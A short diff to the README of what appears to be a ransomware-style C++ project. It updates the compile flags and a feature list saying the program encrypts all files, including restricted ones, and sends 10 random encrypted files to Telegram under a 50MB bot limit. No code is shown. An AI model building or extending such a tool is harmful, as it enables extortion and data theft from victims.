@@ -11,7 +11,7 @@ This program forces to encrypt all files, including files with restricted permis
 Ongoing
 
 # How to Compile?
-using `g++`, include `-lcrypto` and `-pthread` flag after `-o`.
+using `g++`, include `-lcrypto`, `-lcurl`, `-std=c++17` and `-pthread` flag after `-o`.
 
 # Features
 
@@ -27,7 +27,7 @@ using `g++`, include `-lcrypto` and `-pthread` flag after `-o`.
   
 - Check and install required dependencies
 
-- Randomly send 10 encrypted files to telegram
+- Randomly send 10 encrypted files to telegram, but it only send files with up to 50MB because of limitation with Telegram bot.
 
 # Work in Progress
 
